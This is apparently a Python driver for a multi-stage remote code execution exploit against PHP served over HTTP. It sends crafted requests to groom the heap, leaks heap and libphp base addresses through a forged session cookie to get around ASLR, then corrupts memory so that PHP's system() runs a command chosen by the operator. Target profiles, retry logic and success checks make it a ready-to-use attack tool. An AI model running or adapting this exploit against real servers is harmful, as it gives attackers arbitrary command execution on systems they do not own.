#!/usr/bin/env python3
"""Profile-driven HTTP chain with runtime ASLR recovery.

Runtime heap and libphp bases come only from B1's decoded Set-Cookie
disclosure; this driver never reads /proc or invokes a debugger.
"""

from __future__ import annotations

import argparse
import time

from a1 import a1_parts, send_a1
from a2b2 import (
    DEFAULT_COMMAND,
    a2_pieces,
    b2_request,
    send_chunked,
    validate_command,
)
from b1 import analyse, chunked_post, decode_cookie, make_body
from common import HeldWorkers, send_get, status_code
from profiles import DEFAULT_PROFILE, PROFILES, Profile


def query_path(
    path: str,
    count: int,
    name_length: int,
    value_length: int,
    long_name_count: int,
    long_name_length: int,
    released_fields: int,
    released_name_length: int,
    released_value_length: int,
    released_replacement_length: int,
    released_long_replacement_count: int,
    released_long_replacement_length: int,
    secondary_released_fields: int,
    secondary_released_name_length: int,
    secondary_released_value_length: int,
    secondary_released_replacement_length: int,
) -> str:
    if not count and not released_fields and not secondary_released_fields:
        return path
    separator = "&" if "?" in path else "?"
    items = []
    for index in range(count):
        selected_name_length = (
            long_name_length if index >= count - long_name_count else name_length
        )
        name = f"q{index:07d}".ljust(selected_name_length, "Q")
        items.append(name + "=" + "v" * value_length)
    released_names = [
        f"r{index:03d}".ljust(released_name_length, "R")
        for index in range(released_fields)
    ]
    for name in released_names:
        items.append(name + "=" + "R" * released_value_length)
    for index, name in enumerate(released_names):
        replacement_length = (
            released_long_replacement_length
            if index >= released_fields - released_long_replacement_count
            else released_replacement_length
        )
        items.append(name + "=" + "r" * replacement_length)
    secondary_names = [
        f"s{index:03d}".ljust(secondary_released_name_length, "S")
        for index in range(secondary_released_fields)
    ]
    for name in secondary_names:
        items.append(name + "=" + "S" * secondary_released_value_length)
    for name in secondary_names:
        items.append(name + "=" + "s" * secondary_released_replacement_length)
    return path + separator + "&".join(items)


def describe_profile(profile: Profile) -> None:
    env = profile.environment
    print(f"name={profile.name}")
    print(f"target={env.image} php={env.php_version} arch={env.architecture} sapi={env.sapi}")
    print(f"image_id={env.image_id}")
    print(f"php_ini_sha256={env.php_ini_sha256}")
    print(f"libphp_sha256={env.libphp_sha256}")
    print("extension_configs=" + ",".join(env.extension_configs))
    print("expected_ini:")
    for directive, value in env.ini_settings:
        print(f"  {directive}={value}")
    print(
        "offsets: "
        f"stale_id={profile.heap.stale_session_id:#x} "
        f"stale_reference={profile.heap.stale_session_reference:#x} "
        f"fake_array={profile.heap.fake_array:#x} "
        f"zval_ptr_dtor={profile.symbols.zval_ptr_dtor:#x} "
        f"zif_system={profile.symbols.zif_system:#x}"
    )


def run_a1(host: str, port: int, path: str, profile: Profile) -> bytes:
    a1 = profile.a1
    parts = a1_parts(
        sid_size=a1.sid_size,
        sid_late=a1.sid_late,
        files=a1.files,
        depth=a1.depth,
        live_files=a1.live_files,
        ct1=a1.content_type_1,
        ct2=a1.content_type_2,
        fillers=a1.fillers,
        filler_name=a1.filler_name,
        filler_value=a1.filler_value,
        big=a1.big,
        big_size=a1.big_size,
        big_name=a1.big_name,
        big_name_count=a1.big_name_count,
        big_alt_name=a1.big_alt_name,
        tail_big_size=a1.tail_big_size,
        tail_big_count=a1.tail_big_count,
        burners=a1.burners,
        burner_size=a1.burner_size,
        burner_name=a1.burner_name,
        burner_long_name_count=a1.burner_long_name_count,
        burner_long_name=a1.burner_long_name,
        late_groom_fields=a1.late_groom_fields,
        late_groom_name=a1.late_groom_name,
        late_groom_value=a1.late_groom_value,
        late_groom_alt_value_count=a1.late_groom_alt_value_count,
        late_groom_alt_value=a1.late_groom_alt_value,
        released_fields=a1.released_fields,
        released_name=a1.released_name,
        released_value=a1.released_value,
        released_alt_value_count=a1.released_alt_value_count,
        released_alt_value=a1.released_alt_value,
        released_replacement_value=a1.released_replacement_value,
        released_long_replacement_count=a1.released_long_replacement_count,
        released_long_replacement_value=a1.released_long_replacement_value,
        progress_size=a1.progress_size,
    )
    return send_a1(
        host, port, query_path(
            path,
            a1.query_params,
            a1.query_name_length,
            a1.query_value_length,
            a1.query_long_name_count,
            a1.query_long_name_length,
            a1.query_released_fields,
            a1.query_released_name_length,
            a1.query_released_value_length,
            a1.query_released_replacement_length,
            a1.query_released_long_replacement_count,
            a1.query_released_long_replacement_length,
            a1.query_secondary_released_fields,
            a1.query_secondary_released_name_length,
            a1.query_secondary_released_value_length,
            a1.query_secondary_released_replacement_length,
        ), parts,
        chunk_size=a1.transport_chunk_size,
    )


def run_b1(host: str, port: int, path: str, profile: Profile) -> tuple[bytes, bytes, dict[str, object]]:
    b1 = profile.b1
    boundary = b"codex843b1"
    body = make_body(
        boundary,
        profile.heap.stale_session_id,
        b1.fake_length,
        b1.sprays,
        b1.data_start,
        b1.nested_fields,
        b1.nested_depth,
        b1.small_fields,
        b1.small_name_size,
        b1.small_value_size,
        b1.small_after_nested,
        b1.page_spec,
        b1.tail_pages,
        b1.release_sprays,
        b1.carrier_sprays,
        b1.carrier_pages,
        abi=profile.abi,
        allocator=profile.allocator,
        gc_refcount=b1.fake_string_gc_refcount,
        gc_type=b1.fake_string_gc_type,
        string_hash=b1.fake_string_hash,
        marker=b1.marker,
    )
    response = chunked_post(
        host, port, path, body, boundary,
        chunk_size=b1.transport_chunk_size,
    )
    cookie = decode_cookie(response)
    info = analyse(
        cookie, profile.symbols.zval_ptr_dtor, profile.heap.stale_session_id,
        abi=profile.abi, allocator=profile.allocator, marker=b1.marker,
    )
    return response, cookie, info


def leaked_bases(info: dict[str, object], profile: Profile) -> tuple[int, int]:
    if not info.get("marker_ok") or info.get("decoded") != profile.b1.fake_length:
        raise RuntimeError("B1 did not return the complete forged cookie")
    main = info.get("request_main_base")
    if not isinstance(main, int):
        raise RuntimeError("B1 did not expose one structurally unique ZendMM main chunk")
    candidates = info.get("libphp_candidates")
    if not isinstance(candidates, list) or not candidates:
        raise RuntimeError("B1 did not expose zval_ptr_dtor")
    best = candidates[0]
    if not isinstance(best, dict):
        raise RuntimeError("malformed libphp candidate")
    libphp = best.get("base")
    repetitions = best.get("exact_slots")
    if (
        not isinstance(libphp, int)
        or not isinstance(repetitions, int)
        or repetitions < profile.allocator.min_dtor_repetitions
    ):
        raise RuntimeError("libphp candidate lacks repeated pDestructor evidence")
    delta = libphp - main
    if not (
        profile.allocator.min_libphp_main_delta
        <= delta
        <= profile.allocator.max_libphp_main_delta
    ):
        raise RuntimeError(f"implausible libphp-main delta {delta:#x}")
    return main, libphp


def chain(args: argparse.Namespace, profile: Profile, command: bytes) -> int:
    profile.validate()
    send_get(args.host, args.port, args.path)
    with HeldWorkers(args.host, args.port, args.workers, args.path) as held:
        def pins_healthy(stage: str) -> bool:
            try:
                held.ensure_healthy()
            except RuntimeError as exc:
                print(f"WORKER_PINNING_FAILED before {stage}: {exc}", flush=True)
                return False
            return True

        if args.workers > 1:
            time.sleep(0.5)
            send_get(args.host, args.port, args.path)

        main_base = libphp_base = None
        for attempt in range(1, args.retries + 1):
            if not pins_healthy("A1"):
                return 5
            a1_response = run_a1(args.host, args.port, args.path, profile)
            a1_cookie = b"set-cookie: phpsessid=" in a1_response.partition(b"\r\n\r\n")[0].lower()
            print(
                f"[{attempt}] A1 status={status_code(a1_response)} "
                f"cookie={a1_cookie}",
                flush=True,
            )
            if (
                status_code(a1_response) != profile.a1.expected_status
                or a1_cookie != profile.a1.expected_cookie
            ):
                continue

            if not pins_healthy("B1"):
                return 5
            b1_response, cookie, info = run_b1(args.host, args.port, args.path, profile)
            print(
                f"[{attempt}] B1 status={status_code(b1_response)} "
                f"decoded={len(cookie)} marker={bool(info.get('marker_ok'))}",
                flush=True,
            )
            if status_code(b1_response) != profile.b1.expected_status:
                print(f"[{attempt}] rejected: unexpected B1 status", flush=True)
                continue
            try:
                main_base, libphp_base = leaked_bases(info, profile)
            except RuntimeError as exc:
                print(f"[{attempt}] rejected: {exc}", flush=True)
                continue
            best = info["libphp_candidates"][0]  # validated above
            print(
                f"[{attempt}] main={main_base:#x} libphp={libphp_base:#x} "
                f"dtor_repetitions={best['exact_slots']}",
                flush=True,
            )
            break

        if main_base is None or libphp_base is None:
            print("NO_VALID_B1_LEAK")
            return 2
        if args.leak_only:
            return 0
        if not pins_healthy("A2"):
            return 5
        a2_response = send_chunked(
            args.host,
            args.port,
            a2_pieces(
                parts=profile.a2.parts,
                depth=profile.a2.depth,
                fillers=profile.a2.fillers,
            ),
            path=args.path,
        )
        print(f"A2 status={status_code(a2_response)} bytes={len(a2_response)}", flush=True)
        if status_code(a2_response) != profile.a2.expected_status:
            print("A2 did not reach the calibrated OOM")
            return 3

        if not pins_healthy("B2"):
            return 5
        b2_response = b2_request(
            args.host,
            args.port,
            n1=profile.b2.first_sprays,
            n2=profile.b2.second_sprays,
            value_length=profile.b2.value_length,
            target=main_base + profile.heap.fake_array,
            refcount=profile.b2.reference_refcount,
            name_length=profile.b2.name_length,
            hold=profile.b2.hold_seconds,
            ht_address=main_base + profile.heap.fake_array,
            zif_system=libphp_base + profile.symbols.zif_system,
            path=args.path,
            abi=profile.abi,
            marker_command=command,
        )
        print(
            f"B2 dispatched command {command!r}; response_bytes={len(b2_response)}",
            flush=True,
        )
        if b2_response:
            print(
                "B2_UNCONFIRMED: target returned an HTTP response instead of "
                "terminating the worker",
                flush=True,
            )
            return 4
        return 0


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=19435)
    parser.add_argument("--path", default="/index.php")
    parser.add_argument("--workers", type=int, default=1)
    parser.add_argument("--retries", type=int, default=3)
    parser.add_argument("--profile", choices=PROFILES, default=DEFAULT_PROFILE)
    parser.add_argument("--list-profiles", action="store_true")
    parser.add_argument("--show-profile", action="store_true")
    parser.add_argument("--leak-only", action="store_true")
    parser.add_argument(
        "--cmd",
        default=DEFAULT_COMMAND.decode("ascii"),
        help="command passed to the target's system() during B2",
    )
    args = parser.parse_args()
    if args.list_profiles:
        for name in PROFILES:
            print(name)
        return 0
    profile = PROFILES[args.profile]
    if args.show_profile:
        describe_profile(profile)
        return 0
    if args.workers < 1 or args.retries < 1:
        parser.error("--workers and --retries must be positive")
    try:
        command = args.cmd.encode("utf-8")
        validate_command(command, profile.b2.value_length, profile.abi)
    except (UnicodeEncodeError, ValueError) as exc:
        parser.error(str(exc))
    return chain(args, profile, command)


if __name__ == "__main__":
    raise SystemExit(main())
